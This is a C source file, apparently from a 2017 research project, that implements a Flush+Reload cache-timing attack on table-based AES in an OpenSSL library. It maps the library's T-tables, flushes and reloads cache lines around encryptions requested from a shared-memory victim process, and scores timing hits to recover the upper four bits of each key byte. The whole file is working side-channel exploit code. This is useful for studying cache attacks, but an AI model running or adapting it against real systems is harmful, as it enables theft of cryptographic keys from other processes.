/**
 *	sync one round attack
 *
 *	Copyright (C) 2017  Jinbum Park <jinb.park@samsung.com> Haehyun Cho <haehyun@asu.edu>
*/

#include "common.h"
#include <stdbool.h>
#include <libflush.h>
#include <pthread.h>
#include <sched.h>

#define MAX_PLAINS 3000
#define ATTACK_MODE_FULL 0
#define ATTACK_MODE_ONE 1

U8 real_key[16] = {0x9e,0x41,0x00,0x5f,0xd9,0xa0,0xc2,0x28,0xe7,0xb4,0x31,0x29,0x94,0xaa,0x4d,0xc7};
U8 infer_key[16] = {0,};
U8 plains[MAX_PLAINS][16];
U8 enc[16] = {0x00,};
U32 plain_text_cnt = 0;
U32 attack_mode = ATTACK_MODE_FULL;

int crypto_fd;
void *crypto_addr;
U32 crypto_size;
unsigned int *te0, *te1, *te2, *te3;
unsigned int off_te0, off_te1, off_te2, off_te3;
const int cache_line_size = 64;
uint64_t threshold = 300;
U32 score[16][16] = {0,};
libflush_session_t *session;

void map_crypto(const char *path)
{
	struct stat st;

	crypto_fd = open(path, O_RDONLY);
	if(crypto_fd < 0) {
		printf("open error\n");
		exit(-1);
	}

	fstat(crypto_fd, &st);
	crypto_size = st.st_size;

	crypto_addr = mmap(NULL, crypto_size, PROT_READ, MAP_PRIVATE, crypto_fd, 0);
	if(crypto_addr == NULL) {
		printf("mmap error\n");
		exit(-1);
	}
	
	te0 = (U8 *)crypto_addr + off_te0;
	te1 = (U8 *)crypto_addr + off_te1;
	te2 = (U8 *)crypto_addr + off_te2;
	te3 = (U8 *)crypto_addr + off_te3;

	printf("[0] : %08x\n", *(te0));
	printf("[1] : %08x\n", *(te0 + 1));
	printf("[2] : %08x\n", *(te0 + 2));

	//munmap(crypto_addr, size);
	//close(crypto_fd);
}

void string_to_hex(U8 *pIn, unsigned int pInLen, U8 *pOut)
{
   unsigned int i, j;
   unsigned int mul;
   char data = 0;

   for(i=0, j=0; i<pInLen; i++) {
       if(i % 2 == 0)
           mul = 16;
       else
           mul = 1;

       if(pIn[i] >= '0' && pIn[i] <= '9')
           data += ((pIn[i] - 48) * mul);
       else if(pIn[i] >= 'a' && pIn[i] <= 'f')
           data += ((pIn[i] - 87) * mul);
       else if(pIn[i] >= 'A' && pIn[i] <= 'F')
           data += ((pIn[i] - 55) * mul);
       else
           return;

       if(mul == 1)
       {
           pOut[j] = data;
           data = 0;
           j++;
       }
   }
}


void read_plains(void)
{
	FILE *fp;
	char tmp[64] = {0,};
	U32 i, j, cnt;

	memset(plains, 0, sizeof(plains));

	fp = fopen("./plain.txt", "r");
	if(!fp) {
		printf("read plains error\n");
		exit(-1);
	}
 
	fscanf(fp, "%d\n", &cnt);
	if(MAX_PLAINS < plain_text_cnt)
		plain_text_cnt = MAX_PLAINS;

	i = 0;
	while(!feof(fp)) {
		fgets(tmp, sizeof(tmp), fp);
		string_to_hex(tmp, 32, plains[i]);
		memset(tmp, 0, sizeof(tmp));

		i++;
		if(i == plain_text_cnt)
			break;
	}

	fclose(fp);
}

static void hex_string_to_int(unsigned char *pIn, unsigned int pInLen, unsigned int *pOut)
{
    /* HexString must be Big-Endian!! */
    int is_little_endian = 0;
    unsigned int test = 0x10000001;
    char *ptr = (char*)&test;

    if(ptr[0] == 0x01)
    {
        is_little_endian = 1;
    }
    if(pInLen != sizeof(unsigned int) * 2)
    {
        return;
    }
    string_to_hex((unsigned char*)pIn, pInLen, (char*)pOut);

    if(is_little_endian)
    {
        char tmp;
        unsigned int i, j;

        ptr = (char*)pOut;
        for(i=0, j=sizeof(unsigned int)-1; i<sizeof(unsigned int); i++, j--)
        {
            if(i > j)
            {
                break;
            }
            tmp = ptr[i];
            ptr[i] = ptr[j];
            ptr[j] = tmp;
        }
    }
} 

void get_args(int argc, char **argv)
{
	if(argc != 9) {
		printf("USAGE: ./attack <plain text cnt> <cache hit threshold> <offset te0> <offset te1> <offset te2> <offset te3> <attack mode> <crypto library path>\n");
		printf("EXAMPLE: ./attack 1000 200 001636c0 001637c0 001638c0 001639c0 0 libcrypto.so.1.0.0\n");
		exit(-1);
	}

	plain_text_cnt = atoi(argv[1]);
	threshold = (uint64_t)atoi(argv[2]);
	hex_string_to_int(argv[3], strlen(argv[3]), &off_te0);
	hex_string_to_int(argv[4], strlen(argv[4]), &off_te1);
	hex_string_to_int(argv[5], strlen(argv[5]), &off_te2);
	hex_string_to_int(argv[6], strlen(argv[6]), &off_te3);
	attack_mode = atoi(argv[7]);
}

static inline void flush_te(U32 x)
{
	unsigned int *ptr = NULL;
	unsigned int te_idx = x % 4;

	if(te_idx == 0) ptr = te0;
	else if(te_idx == 1) ptr = te1;
	else if(te_idx == 2) ptr = te2;
	else ptr = te3;
	
	libflush_flush(session, ptr + (x * 16));
}

static inline void flush_te0(U32 x)
{
	libflush_flush(session, te0 + (x * 16));
}

static inline int reload_te_is_useful(U32 x)
{
	uint64_t count;
	unsigned int *ptr = NULL;
	unsigned int te_idx = x % 4;

	if(te_idx == 0) ptr = te0;
	else if(te_idx == 1) ptr = te1;
	else if(te_idx == 2) ptr = te2;
	else ptr = te3;

	count = libflush_reload_address(session, ptr + (x * 16));

	if(count < threshold)
		return 1;
	return 0;
}

static inline int reload_te0_is_useful(U32 x)
{
	uint64_t count;
	
	count = libflush_reload_address(session, te0 + (x * 16));

	if(count < threshold)
		return 1;
	return 0;
}


U32 arr_score[16] = {0,};
static inline void arr_add_score(U8 *arr)
{
	U8 i;
	for(i=0; i<16; i++) {
		if(arr[i] == 1)
			arr_score[i] += 1;
	}
}

static inline void print_score(void)
{
	U8 i;
	printf("\nscore: ");
	for(i=0; i<16; i++) {
		printf("[%d-%d]", i, arr_score[i]);
	}
}

void print_theory_arr(int plain_idx)
{
	U8 theory_arr[16] = {0,};
	U8 val;
	U32 i;

	/* fill theory arr of one-round encryption */
	for(i=0; i<16; i+=4) {
		val = plains[plain_idx][i] ^ real_key[i];
		val = val >> 4;
		theory_arr[val] = 1;
	}

	/* print */
	printf("\ntheory-arr: ");
	for(i=0; i<16; i++) {
		if(theory_arr[i] == 1)
			printf("%d,", i);
	}
	printf("\n");
}


struct shm_msg *client_msg;
struct shm_msg *server_msg;

void do_encrypt(U32 p)
{
	U32 j;

	/* prepare msg */
	client_msg->status = 0;
	client_msg->len = 16;
	
	/* send msg */
	memcpy(client_msg->msg, plains[p], 16);
	client_msg->status = 1;

	/* read reply */
	while(1) {
		if(server_msg->status == 1) {
			memcpy(enc, server_msg->msg, server_msg->len);
			server_msg->status = 0;
			break;
		}
	}
}

static inline int add_score(U32 p, U8 *arr)
{
	U8 i, j;
	U8 val;

	for(i=0; i<16; i++) {
		for(j=0; j<16; j++) {
			if(arr[j] == 1) {
				val = plains[p][i];
				val = val >> 4;
				score[i][val ^ j] += 1;
			}
		}
	}
	return 0;
}

void predict_key(void)
{
	U32 i, j;
	U8 val;
	int max = -1;
	int best = -1;
	int bits = 0;

	for(i=0; i<16; i++) {
		max = -1;
		best = -1;

		for(j=0; j<16; j++) {
			if(max < (int)score[i][j]) {
				max = (int)score[i][j];
				best = j;
			}
		}
		infer_key[i] = (U8)best;
	}

	printf("real key : \n");
	for(i=0; i<16; i++)
		printf("%02x", real_key[i]);
	printf("\n");

	printf("infer key : \n");
	for(i=0; i<16; i++)
		printf("%02x", infer_key[i] * 16);
	printf("\n");

	for(i=0; i<16; i++) {
		val = real_key[i] >> 4;
		if(val == infer_key[i])
			bits += 4;
	}
	printf("recover bits : %d\n", bits);
}

void do_attack(void)
{
	U32 p, i, c, id, t;
	U8 arr[16];
	U32 cnt;
	U32 sum;
	U8 ideal[256];

	sum = 0;
	memset(score, 0, sizeof(score));

	printf("[attack info]\n");
	printf("cache attack type :  Flush+Reload\n");
	printf("aes attack type : sync aes one round attack\n");
	printf("plain texts : %d\n", plain_text_cnt);

	for(p=0; p<plain_text_cnt; p++) {
		memset(ideal, 0, 256);
		memset(arr, 0, 16);
		cnt = 0;

		for(i=0; i<16; i++) {
			/* 1. flush */
			flush_te(i);

			/* 2. encrypt */
			do_encrypt(p);

			/* 3. reload */
			if(reload_te_is_useful(i) == 1) {
				cnt++;
				arr[i] = 1;
			}
		}

		add_score(p, arr);
		if(p % 100 == 0)
			printf("progress : %d / %d\n", p, plain_text_cnt);
	}
}

void do_attack_one(void)
{
	U32 p, i, c, id, t;
	U8 arr[16];
	U32 cnt;
	U32 sum;
	U8 ideal[256];

	sum = 0;
	memset(score, 0, sizeof(score));

	printf("[attack info]\n");
	printf("cache attack type :  Flush+Reload\n");
	printf("aes attack type : sync aes one round attack\n");
	printf("test count : %d\n", plain_text_cnt);

	memset(arr_score, 0, sizeof(arr_score));
	p = 0;
	for(t=0; t<plain_text_cnt; t++) {
		memset(ideal, 0, 256);
		memset(arr, 0, 16);
		cnt = 0;

		for(i=0; i<16; i++) {
			/* 1. flush. verify te0 only. */
			flush_te0(i);

			/* 2. encrypt */
			do_encrypt(p);

			/* 3. reload */
			if(reload_te0_is_useful(i) == 1) {
				cnt++;
				arr[i] = 1;
			}
		}

		arr_add_score(arr);
		if(t % 100 == 0)
			printf("progress : %d / %d\n", p, plain_text_cnt);
	}

	print_score();
	print_theory_arr(p);
}


void init_libflush(void)
{
	bool r;

	r = libflush_init(&session, NULL);
	if(r == false) {
		printf("libflush_init error\n");
		exit(-1);
	}
}

void finalize_libflush(void)
{
	libflush_terminate(session);
}

int main(int argc, char **argv)
{
	char msg[MSG_SIZE_MAX];

	void *addr;
	int fd;
	ssize_t nread;

	int msg_size, repeat_count = 1;
	unsigned int i, j;

	/* init */
	get_args(argc, argv);
	read_plains();
	map_crypto(argv[8]);
	init_libflush();

	/* get shm */
	if((fd = shm_open(SHM_NAME, O_RDWR, PERM_FILE)) == -1) {
		printf("shm_open error : %s\n", strerror(errno));
		return -1;
	}

	/* mmap */
	addr = mmap(NULL, MSG_SIZE_MAX, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
	if(addr == MAP_FAILED) {
		printf("mmap error : %s\n", strerror(errno));
		goto out;
	}

	client_msg = (struct shm_msg *)((char*)addr + SHM_CLIENT_BUF_IDX);
	server_msg = (struct shm_msg *)((char*)addr + SHM_SERVER_BUF_IDX);

	/* send msg */
	if(attack_mode == ATTACK_MODE_FULL)
		do_attack();
	else if(attack_mode == ATTACK_MODE_ONE)
		do_attack_one();
	predict_key();

	/* send end msg */
	client_msg->status = 0;
	client_msg->len = sizeof(END_MSG);
	strncpy(client_msg->msg, END_MSG, client_msg->len);
	client_msg->status = 1;

out:
	/* close shm */
	if(munmap(addr, MSG_SIZE_MAX) == -1) {
		printf("munmap error : %s\n", strerror(errno));
	}

	if(close(fd) == -1) {
		printf("close error : %s\n", strerror(errno));
		return -1;
	}

	finalize_libflush();
	munmap(crypto_addr, crypto_size);
	close(crypto_fd);
	return 0;
}
